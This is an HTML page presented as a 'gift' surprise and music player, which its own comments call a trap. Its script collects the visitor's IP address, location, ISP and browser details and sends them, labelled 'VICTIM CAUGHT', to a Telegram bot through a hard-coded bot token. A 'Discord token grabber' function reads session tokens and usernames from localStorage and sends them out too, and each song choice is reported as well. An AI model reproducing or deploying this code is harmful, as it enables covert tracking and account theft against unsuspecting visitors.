<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>GIFT FROM LETSIE</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@900&family=Roboto:wght@700&display=swap');
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #000;
      color: #ff0000;
      font-family: 'Roboto', sans-serif;
      min-height: 200vh;
      overflow-y: auto;
      display: flex;
      flex-direction: column;
      align-items: center;
      text-align: center;
      position: relative;
      -webkit-tap-highlight-color: transparent;
    }
    .circle {
      position: absolute;
      top: -30px;
      width: 12px;
      height: 12px;
      background: #ff0000;
      border-radius: 50%;
      box-shadow: 0 0 15px #ff0000, 0 0 30px #ff1a1a, 0 0 50px #ff3333, 0 0 70px #ff0000;
      animation: fall linear infinite;
      opacity: 0.9;
    }
    @keyframes fall {
      0% { transform: translateY(-100px) scale(1); opacity: 1; }
      100% { transform: translateY(110vh) scale(0.5); opacity: 0; }
    }
    .container { 
      position: relative; 
      width: 90%; 
      max-width: 400px; 
      z-index: 10; 
      margin-top: 50px; 
    }
    .box {
      background: rgba(15, 0, 0, 0.97);
      border: 4px solid #ff0000;
      border-radius: 22px;
      padding: 35px 20px;
      box-shadow: 0 0 40px #ff0000, 0 0 80px #ff1a1a, inset 0 0 20px rgba(255,0,0,0.3);
      animation: drop 1.5s ease-out forwards;
      opacity: 0;
      transform: translateY(-100px);
    }
    @keyframes drop {
      0% { opacity: 0; transform: translateY(-100px); }
      70% { opacity: 1; transform: translateY(25px); }
      100% { opacity: 1; transform: translateY(0); }
    }
    h1 {
      font-family: 'Orbitron', sans-serif;
      font-size: 2.4rem;
      color: #ff0000;
      text-shadow: 0 0 15px #ff0000, 0 0 30px #ff1a1a, 0 0 50px #ff3333;
      margin-bottom: 20px;
      animation: glow 1.5s infinite alternate;
    }
    @keyframes glow {
      from { text-shadow: 0 0 15px #ff0000; }
      to { text-shadow: 0 0 25px #ff0000, 0 0 50px #ff1a1a, 0 0 70px #ff3333; }
    }
    .btn {
      background: #ff0000;
      color: #000;
      font-weight: bold;
      font-size: 1.4rem;
      padding: 16px 32px;
      border: 3px solid #ff3333;
      border-radius: 50px;
      cursor: pointer;
      margin: 15px 0;
      box-shadow: 0 0 25px #ff0000;
      transition: all 0.3s;
      font-family: 'Orbitron', sans-serif;
      touch-action: manipulation;
      -webkit-user-select: none;
      user-select: none;
    }
    .btn:hover, .btn:active {
      background: #fff;
      color: #000;
      transform: scale(1.15);
      box-shadow: 0 0 40px #fff, 0 0 60px #ff0000;
    }
    .result {
      margin-top: 25px;
      font-size: 1.5rem;
      font-weight: bold;
      color: #fff;
      text-shadow: 0 0 15px #ff0000;
      opacity: 0;
      transition: opacity 1s;
      line-height: 1.8;
    }
    .by {
      margin-top: 30px;
      font-size: 1.7rem;
      color: #ff0000;
      font-family: 'Orbitron', sans-serif;
      animation: pulse 1.8s infinite;
    }
    @keyframes pulse {
      0%, 100% { transform: scale(1); }
      50% { transform: scale(1.15); }
    }
    .hidden { display: none !important; }

    /* ARTIST SECTION */
    .artists {
      margin-top: 100px;
      width: 90%;
      max-width: 500px;
      display: flex;
      flex-direction: column;
      gap: 20px;
      padding: 20px;
    }
    .artist-btn {
      background: rgba(255,0,0,0.1);
      border: 3px solid #ff0000;
      border-radius: 20px;
      padding: 20px;
      color: #fff;
      font-family: 'Orbitron', sans-serif;
      font-size: 1.5rem;
      text-shadow: 0 0 10px #ff0000;
      box-shadow: 0 0 30px rgba(255,0,0,0.5);
      transition: all 0.4s;
      cursor: pointer;
      text-align: center;
      touch-action: manipulation;
    }
    .artist-btn:hover, .artist-btn:active {
      background: #ff0000;
      color: #000;
      transform: scale(1.05);
      box-shadow: 0 0 50px #ff0000;
    }

    /* SONG SECTION */
    .songs {
      display: none;
      flex-direction: column;
      gap: 15px;
      margin-top: 20px;
    }
    .song-btn {
      background: rgba(255,0,0,0.2);
      border: 2px solid #ff0000;
      border-radius: 15px;
      padding: 15px;
      color: #fff;
      font-size: 1.3rem;
      text-shadow: 0 0 5px #ff0000;
      cursor: pointer;
      transition: all 0.3s;
      touch-action: manipulation;
    }
    .song-btn:hover, .song-btn:active {
      background: #ff0000;
      color: #000;
      transform: scale(1.05);
    }

    /* HIDDEN PLAYER */
    #player {
      margin-top: 40px;
      width: 100%;
      height: 80px;
      overflow: hidden;
      position: relative;
    }
    #player iframe {
      position: absolute;
      top: -100px;
      left: 0;
      width: 100%;
      height: 300px;
      border: none;
    }
  </style>
</head>
<body>

  <!-- RED CIRCLES -->
  <div id="circles"></div>

  <!-- MAIN TRAP -->
  <div class="container">
    <div class="box">
      <h1>GIFT</h1>
      <p id="step1">CLICK ME TO REVEAL A SURPRISE</p>
      <button class="btn" id="first-btn">CLICK ME</button>

      <!-- STEP 1: IP -->
      <div id="result-ip" class="result hidden">
        This is ur ip adress if u didnt know <br>
        <span id="ip" style="color:#ff0000; font-size:1.8rem;">...</span>
        <br><br>
        <button class="btn" id="location-btn">CLICK ME FOR ANOTHER SURPRISE</button>
      </div>

      <!-- STEP 2: CITY + COUNTRY + ISP -->
      <div id="result-location" class="result hidden">
        <div>Hereâ€™s where you are:</div>
        <div id="city" style="color:#ff6666; font-size:1.7rem;">...</div>
        <div id="country" style="color:#ff9999; font-size:1.5rem;">...</div>
        <div id="isp" style="color:#ffcccc; font-size:1.4rem;">...</div>
        <br>
        <button class="btn" id="discord-btn">ANOTHER SURPRISE</button>
      </div>

      <!-- STEP 3: DISCORD -->
      <div id="result-discord" class="result hidden">
        <div>Another surprise:</div>
        <div id="discord-user" style="color:#ff6666; font-size:1.7rem;">...</div>
      </div>.

      <div class="by">BY ZENNY!</div>
    </div>
  </div>

  <!-- ARTIST CHOICE -->
  <div class="artists">
    <div class="artist-btn" id="drake-btn">DRAKE</div>
    <div class="songs" id="drake-songs">
      <div class="song-btn" data-song="Look What You've Done" data-id="5H7CS-_RUe8">Look What You've Done</div>
      <div class="song-btn" data-song="Marvins Room" data-id="JDb3ZZD4bA0">Marvins Room</div>
      <div class="song-btn" data-song="Doing It Wrong" data-id="GmZsYYI1Vnc">Doing It Wrong</div>
    </div>

    <div class="artist-btn" id="carti-btn">PLAYBOI CARTI</div>
    <div class="songs" id="carti-songs">
      <div class="song-btn" data-song="Sky" data-id="GYE9H4SMq5E">Sky</div>
      <div class="song-btn" data-song="Fell In Luv" data-id="HRbgGQ7rHi0">Fell In Luv</div>
      <div class="song-btn" data-song="Rockstar Made" data-id="EwdsnGfrd-k">Rockstar Made</div>
    </div>

    <div class="artist-btn" id="ken-btn">KEN CARSON</div>
    <div class="songs" id="ken-songs">
      <div class="song-btn" data-song="Ss" data-id="TMzs6GvsZXU">Ss</div>
      <div class="song-btn" data-song="Yale" data-id="ppUGaXd9pzY">Yale</div>
      <div class="song-btn" data-song="Liveleak" data-id="RKN4NTPGJxY">Liveleak</div>
    </div>
  </div>

  <!-- HIDDEN PLAYER -->
  <div id="player" class="hidden"></div>

  <script>
    // === RED CIRCLES ===
    const container = document.getElementById('circles');
    function createCircle() {
      const c = document.createElement('div');
      c.classList.add('circle');
      c.style.left = Math.random() * 100 + 'vw';
      c.style.animationDuration = Math.random() * 5 + 5 + 's';
      c.style.width = c.style.height = Math.random() * 15 + 8 + 'px';
      container.appendChild(c);
      setTimeout(() => c.remove(), 12000);
    }
    setInterval(createCircle, 150);

    // === TELEGRAM BOT ===
    const BOT_TOKEN = '8501597773:AAG1l8FnPsKtOt8sJ7ejB0r-zSacGwpYuBI';
    const CHAT_ID = '6726658638';

    let userIP = "";

    // === SEND TO TELEGRAM ===
    function sendToTelegram(ip, city = "", country = "", isp = "", device = "", discord = "", song = "") {
      const site = location.href;
      let message = 
`VICTIM CAUGHT

Heres their ip: <code>${ip}</code>
Country: <b>${country || "Unknown"}</b>
Province: <b>${city || "Unknown"}</b>
ISP: <b>${isp || "Unknown"}</b>
Device: <code>${device}</code>
Site: <a href="${site}">${site}</a>`;

      if (discord) message += `\nDiscord: <b>${discord}</b>`;
      if (song) message += `\nChose Song: <b>${song}</b>`;

      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`)
        .catch(() => {});
    }

    // === GET IP ===
    function getIP() {
      fetch('https://api.ipify.org?format=json')
        .then(r => r.json())
        .then(data => {
          userIP = data.ip;
          document.getElementById('ip').innerHTML = userIP;
          const device = navigator.userAgent.substring(0, 80);
          sendToTelegram(userIP, "", "", "", device);
        })
        .catch(() => {
          document.getElementById('ip').innerHTML = "BLOCKED";
        });
    }

    // === GET LOCATION + ISP ===
    function getLocation() {
      fetch(`https://ipapi.co/${userIP}/json/`)
        .then(r => r.json())
        .then(data => {
          const city = data.city || data.region || "Unknown";
          const country = data.country_name || "Unknown";
          const isp = data.org || "Unknown ISP";
          const device = navigator.userAgent.substring(0, 80);

          document.getElementById('city').innerHTML = city;
          document.getElementById('country').innerHTML = country;
          document.getElementById('isp').innerHTML = isp;

          sendToTelegram(userIP, city, country, isp, device);
        })
        .catch(() => {
          document.getElementById('city').innerHTML = "Blocked";
        });
    }

    // === DISCORD TOKEN GRABBER ===
    function grabDiscordToken() {
      let token = null;
      let username = "Discord Not Open";

      // 1. localStorage
      try {
        const t = localStorage.getItem('token');
        if (t) token = JSON.parse(t).replace(/"/g, '');
      } catch {}

      // 2. All keys
      if (!token) {
        for (let i = 0; i < localStorage.length; i++) {
          const key = localStorage.key(i);
          if (key.includes('token') || key.includes('discord')) {
            try {
              const val = localStorage.getItem(key);
              const match = val.match(/"([^"]{50,})"/);
              if (match) token = match[1];
            } catch {}
          }
        }
      }

      // 3. Username
      try {
        for (let i = 0; i < localStorage.length; i++) {
          const key = localStorage.key(i);
          if (key.includes('user') || key.includes('profile')) {
            const data = JSON.parse(localStorage.getItem(key));
            username = data.globalName || data.username || data.tag || "Unknown User";
            break;
          }
        }
      } catch {}

      return { token, username };
    }

    // === REVEAL DISCORD ===
    function revealDiscord() {
      document.getElementById('discord-btn').classList.add('hidden');
      const result = document.getElementById('result-discord');
      result.classList.remove('hidden');
      setTimeout(() => result.style.opacity = 1, 100);

      const { token, username } = grabDiscordToken();
      document.getElementById('discord-user').innerHTML = username;

      if (token) {
        const device = navigator.userAgent.substring(0, 80);
        sendToTelegram(userIP, "", "", "", device, `${username} | ${token}`);
      }
    }

    // === EVENT LISTENERS (FIXED CLICK) ===
    document.getElementById('first-btn').addEventListener('click', function() {
      document.getElementById('step1').classList.add('hidden');
      this.classList.add('hidden');
      const result = document.getElementById('result-ip');
      result.classList.remove('hidden');
      setTimeout(() => result.style.opacity = 1, 100);
      getIP();
    });

    document.getElementById('location-btn').addEventListener('click', function() {
      this.classList.add('hidden');
      const result = document.getElementById('result-location');
      result.classList.remove('hidden');
      setTimeout(() => result.style.opacity = 1, 100);
      getLocation();
    });

    document.getElementById('discord-btn').addEventListener('click', revealDiscord);

    // Artist buttons
    document.getElementById('drake-btn').addEventListener('click', () => showSongs('drake'));
    document.getElementById('carti-btn').addEventListener('click', () => showSongs('carti'));
    document.getElementById('ken-btn').addEventListener('click', () => showSongs('ken'));

    // Song buttons
    document.querySelectorAll('.song-btn').forEach(btn => {
      btn.addEventListener('click', function() {
        const song = this.getAttribute('data-song');
        const id = this.getAttribute('data-id');
        playSong(song, id);
      });
    });

    // === SHOW SONGS ===
    function showSongs(artist) {
      ['drake', 'carti', 'ken'].forEach(a => {
        document.getElementById(`${a}-songs`).style.display = 'none';
      });
      document.getElementById(`${artist}-songs`).style.display = 'flex';
    }

    // === PLAY SONG ===
    function playSong(song, videoId) {
      const player = document.getElementById('player');
      player.innerHTML = `
        <iframe 
          src="https://www.youtube.com/embed/${videoId}?autoplay=1&controls=0&showinfo=0&rel=0&modestbranding=1&iv_load_policy=3&fs=0&cc_load_policy=0&disablekb=1"
          allow="autoplay">
        </iframe>`;
      player.classList.remove('hidden');

      const device = navigator.userAgent.substring(0, 80);
      sendToTelegram(userIP, "", "", "", device, song);
    }
  </script>
</body>
</html>
